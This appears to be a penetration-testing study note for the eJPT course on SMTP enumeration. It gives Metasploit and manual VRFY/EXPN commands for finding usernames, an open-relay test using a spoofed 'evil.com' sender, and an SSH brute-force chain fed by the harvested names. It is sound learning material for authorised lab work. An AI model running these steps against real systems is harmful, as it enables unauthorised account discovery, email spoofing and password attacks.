---
title: SMTP Enumeration
tags: [eJPT, Enumeration, SMTP, Metasploit, UserEnumeration, Postfix]
created: 2026-04-06
source: Notion
---

# SMTP Enumeration

**Related:** [[Introduction-to-Enumeration]] | [[Port-Scanning-Auxiliary-Modules]] | [[SSH-Enumeration]] | [[MySQL-Enumeration]] | [[00-INDEX]]

---

## Overview

SMTP (Simple Mail Transfer Protocol) runs on **port 25 TCP** and is used for sending email. Beyond its mail function, SMTP servers can be abused to enumerate valid system usernames via the `VRFY` and `EXPN` commands.

---

## What is SMTP?

- **Port:** 25 (TCP)
- Used to send email between mail servers and from clients to servers
- Supports commands like `VRFY` (verify a user exists) and `EXPN` (expand a mailing list)
- These commands, when not disabled, leak valid usernames on the system
- Common implementations: **Postfix**, Sendmail, Exim

---

## Metasploit SMTP Auxiliary Modules

### 1. SMTP Version Scanner

```bash
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <target-ip>
run
```

- Identifies the SMTP service and mail server software
- Lab result: **Postfix** (with associated domain name)
- Version info → search for known Postfix vulnerabilities

### 2. SMTP User Enumeration

```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run
```

- Uses `VRFY` and `EXPN` commands to test each username in the wordlist
- Returns a list of **valid system usernames**
- Lab result: **admin / administrator / backup / bin / daemon / www-data**

---

## How SMTP User Enumeration Works

The module sends SMTP `VRFY` requests for each username:

```
VRFY admin
→ 252 2.0.0 admin    (user exists)

VRFY fakeuser
→ 550 5.1.1 fakeuser  (user does not exist)
```

The response code difference reveals whether the account exists.

---

## Full Lab Workflow

```bash
service postgresql start
msfconsole
workspace add SMTP_ENUM

# 1. Version scan
use auxiliary/scanner/smtp/smtp_version
set RHOSTS <target-ip>
run
# Result: Postfix

# 2. User enumeration
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
run
# Result: admin/administrator/backup/bin/daemon/www-data
```

---

## Interacting with SMTP Manually

You can interact with SMTP directly using `telnet` or `nc` — useful for manual user enumeration, testing open relays, or sending spoofed emails.

### Connect

```bash
telnet <target-ip> 25
nc <target-ip> 25
```

### Essential SMTP Commands

| Command | Description |
|---------|-------------|
| `EHLO <domain>` | Greet the server and list supported extensions |
| `HELO <domain>` | Basic greeting (older SMTP) |
| `VRFY <user>` | Check if a username exists on the system |
| `EXPN <list>` | Expand a mailing list to reveal members |
| `MAIL FROM:<addr>` | Set sender address |
| `RCPT TO:<addr>` | Set recipient address |
| `DATA` | Begin email body (end with a single `.` on a line) |
| `QUIT` | Close the connection |

### Manual User Enumeration

```bash
nc <target-ip> 25
EHLO test
VRFY root          # 252 = exists, 550 = does not exist
VRFY admin
VRFY www-data
QUIT
```

### Sending a Test Email (Testing Open Relay)

```bash
telnet <target-ip> 25
EHLO attacker.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@company.com>
DATA
Subject: Test

This is a test email.
.
QUIT
```

> If the server accepts `RCPT TO` for an external domain without authentication, it's an **open relay** — a critical misconfiguration.

---

## Chaining SMTP → SSH

Discovered usernames from SMTP enumeration feed directly into SSH brute force:

```bash
# Save discovered users to a file
echo -e "admin\nadministrator\nbackup\nbin\ndaemon\nwww-data" > smtp_users.txt

# Use with SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-ip>
set USER_FILE /path/to/smtp_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

---

## Searching for Modules

```bash
search type:auxiliary name:smtp
search Postfix    # Find exploits for the identified version
```

---

## Key Takeaways

- SMTP `VRFY`/`EXPN` commands are often left enabled — always check
- **smtp_enum** produces a clean username list — ideal input for SSH/FTP brute force
- `unix_users.txt` is a comprehensive system account wordlist covering common Linux users
- SMTP rarely gives you direct access — its value is **intelligence for other attacks**
- Next topic: **MySQL Enumeration** → [[MySQL-Enumeration]]
